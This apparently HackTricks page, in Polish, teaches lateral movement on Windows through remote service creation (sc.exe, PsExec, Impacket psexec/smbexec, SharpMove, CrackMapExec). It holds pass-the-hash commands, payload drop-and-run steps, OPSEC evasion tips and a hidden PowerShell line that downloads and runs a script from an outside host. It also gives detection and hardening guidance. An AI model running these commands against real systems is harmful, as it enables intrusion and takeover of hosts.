# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Jak działają

Te techniki nadużywają zdalnie Windows Service Control Manager (SCM) przez SMB/RPC, aby wykonywać polecenia na hoście docelowym. Typowy przebieg wygląda następująco:

1. Uwierzytelnij się na hoście docelowym i uzyskaj dostęp do udziału ADMIN$ przez SMB (TCP/445).
2. Skopiuj plik wykonywalny lub wskaż polecenie LOLBAS, które usługa ma uruchomić.
3. Utwórz zdalnie usługę za pomocą SCM (MS-SCMR przez \PIPE\svcctl), wskazującą to polecenie lub plik binarny.
4. Uruchom usługę, aby wykonać payload, i opcjonalnie przechwyć stdin/stdout przez nazwany potok.
5. Zatrzymaj usługę i posprzątaj (usuń usługę oraz wszystkie skopiowane pliki binarne).

Wymagania i warunki wstępne:
- Uprawnienia Local Administrator na hoście docelowym (SeCreateServicePrivilege) lub jawne uprawnienia do tworzenia usług na hoście docelowym.
- Dostępność SMB (445) i udziału ADMIN$; w zaporze hosta musi być dozwolone Remote Service Management.
- UAC Remote Restrictions: w przypadku kont lokalnych filtrowanie tokenów może blokować uprawnienia administratora przez sieć, chyba że używane jest wbudowane konto Administrator lub ustawienie LocalAccountTokenFilterPolicy=1.
- Kerberos a NTLM: użycie nazwy hosta/FQDN umożliwia Kerberos; połączenie przez adres IP często powoduje przejście na NTLM (co może być blokowane w utwardzonych środowiskach).

### Ręczne ScExec/WinExec przez sc.exe

Poniższy przykład pokazuje minimalne podejście do tworzenia usługi. Obraz usługi może być skopiowanym plikiem EXE lub programem LOLBAS, takim jak cmd.exe albo powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notatki:
- Przy uruchamianiu pliku EXE, który nie jest usługą, spodziewaj się błędu przekroczenia limitu czasu; wykonanie i tak nastąpi.
- Aby działać z większą dbałością o OPSEC, preferuj polecenia bezplikowe (`cmd /c`, `powershell -enc`) lub usuwaj pozostawione artefakty.

Bardziej szczegółowe kroki znajdziesz w: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Narzędzia i przykłady

### Sysinternals PsExec.exe

- Klasyczne narzędzie administracyjne, które używa SMB do umieszczenia PSEXESVC.exe w ADMIN$, instaluje tymczasową usługę (domyślna nazwa: PSEXESVC) i przekazuje wejście/wyjście przez nazwane potoki.
- Przykładowe użycie:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Możesz uruchomić bezpośrednio z Sysinternals Live przez WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Pozostawia zdarzenia instalacji/odinstalowania usługi (nazwa usługi to często PSEXESVC, chyba że użyto -r) i podczas działania tworzy plik C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (podobne do PsExec)

- Korzysta z osadzonej usługi podobnej do RemCom. Umieszcza tymczasowy plik binarny usługi (zwykle o losowej nazwie) w ADMIN$, tworzy usługę (domyślnie często RemComSvc) i przekazuje dane wejścia/wyjścia przez nazwany potok.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefakty
- Tymczasowy plik EXE w C:\Windows\ (8 losowych znaków). Domyślna nazwa usługi to RemComSvc, chyba że zostanie zmieniona.

### Impacket smbexec.py (SMBExec)

- Tworzy tymczasową usługę, która uruchamia cmd.exe i używa nazwanego potoku do obsługi wejścia/wyjścia. Zazwyczaj pozwala uniknąć zapisywania pełnego payloadu EXE; wykonywanie poleceń jest częściowo interaktywne.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementuje kilka metod lateral movement, w tym exec oparty na usługach.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) umożliwia modyfikowanie i tworzenie usług w celu zdalnego wykonania polecenia.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Możesz również użyć CrackMapExec do wykonywania poleceń za pomocą różnych backendów (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, wykrywanie i artefakty

Typowe artefakty na hoście/w sieci podczas używania technik podobnych do PsExec:
- Zdarzenia Security 4624 (Logon Type 3) i 4672 (Special Privileges) na celu, dotyczące użytego konta administratora.
- Zdarzenia Security 5140/5145 File Share i File Share Detailed pokazujące dostęp do ADMIN$ oraz utworzenie/zapis plików binarnych usług (np. PSEXESVC.exe lub losowego pliku .exe o nazwie z 8 znaków).
- Zdarzenie **System** 7045 z Service Control Manager dotyczące instalacji usługi na celu: nazwy takie jak PSEXESVC, RemComSvc lub niestandardowa (`-r` / `-service-name`). Potwierdza ono instalację usługi, ale nie to, że jej obraz został uruchomiony. Skoreluj znacznik czasu i ścieżkę obrazu ze zdarzeniami procesów lub pasującym wpisem prefetch obrazu usługi, jeśli jest dostępny.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) dla services.exe lub obrazu usługi, 3 (Network Connect), 11 (File Create) w C:\Windows\, 17/18 (Pipe Created/Connected) dla potoków, takich jak \\.\pipe\psexesvc, \\.\pipe\remcom_* lub ich losowych odpowiedników.
- Artefakt rejestru dotyczący EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hoście operatora (jeśli nie został wyciszony).

Pomysły na wyszukiwanie
- Generuj alerty dotyczące instalacji usług, których ImagePath zawiera cmd.exe /c, powershell.exe lub lokalizacje TEMP.
- Wyszukuj utworzenia procesów, w których ParentImage to C:\Windows\PSEXESVC.exe, lub procesów potomnych services.exe działających jako LOCAL SYSTEM i uruchamiających powłoki.
- Oznaczaj nazwane potoki kończące się na -stdin/-stdout/-stderr lub mające znane nazwy potoków klonów PsExec.

## Rozwiązywanie typowych problemów
- Odmowa dostępu (5) podczas tworzenia usług: konto nie ma faktycznie lokalnych uprawnień administratora, ograniczenia UAC dla kont lokalnych przez sieć albo ochrona EDR przed manipulacją ścieżką pliku binarnego usługi.
- Nie znaleziono ścieżki sieciowej (53) lub nie można połączyć się z ADMIN$: zapora blokuje SMB/RPC albo udziały administracyjne są wyłączone.
- Kerberos nie działa, ale NTLM jest blokowany: połącz się przy użyciu nazwy hosta/FQDN (nie adresu IP), upewnij się, że SPN są poprawne, lub użyj `-k`/`-no-pass` z biletami podczas korzystania z Impacket.
- Uruchomienie usługi przekracza limit czasu, ale payload został uruchomiony: to spodziewane, jeśli plik binarny nie jest prawdziwą usługą; zapisuj dane wyjściowe do pliku albo użyj smbexec, aby uzyskać bieżące I/O.

## Uwagi dotyczące hardeningu
- Windows 11 24H2 i Windows Server 2025 domyślnie wymagają podpisywania SMB dla połączeń wychodzących (oraz przychodzących w Windows 11). Nie zakłóca to legalnego użycia PsExec przy użyciu prawidłowych poświadczeń, ale uniemożliwia nadużycia SMB relay bez podpisu i może wpływać na urządzenia, które nie obsługują podpisywania.<sup>[[2]](#references)</sup>
- Nowe blokowanie NTLM przez klienta SMB (Windows 11 24H2/Server 2025) może uniemożliwić użycie NTLM jako metody zapasowej podczas łączenia się przez adres IP lub z serwerami nieobsługującymi Kerberos. W utwardzonych środowiskach uniemożliwi to korzystanie z PsExec/SMBExec opartych na NTLM; użyj Kerberos (nazwa hosta/FQDN) lub skonfiguruj wyjątki, jeśli jest to uzasadnione.<sup>[[2]](#references)</sup>
- Zasada najmniejszych uprawnień: ogranicz członkostwo w lokalnej grupie administratorów, preferuj Just-in-Time/Just-Enough Admin, wymuszaj użycie LAPS oraz monitoruj i generuj alerty dotyczące instalacji usług 7045.

## Zobacz także

- Zdalne wykonywanie poleceń oparte na WMI (często bez użycia plików):

{{#ref}}
./wmiexec.md
{{#endref}}

- Zdalne wykonywanie poleceń oparte na WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening zabezpieczeń SMB w Windows Server 2025 i Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Wykorzystanie poświadczeń do przejęcia komputerów z Windows — część 2 (PSExec i usługi)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Rozwiązywanie problemów z nieoczekiwanymi ponownymi uruchomieniami przy użyciu dzienników zdarzeń systemowych](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
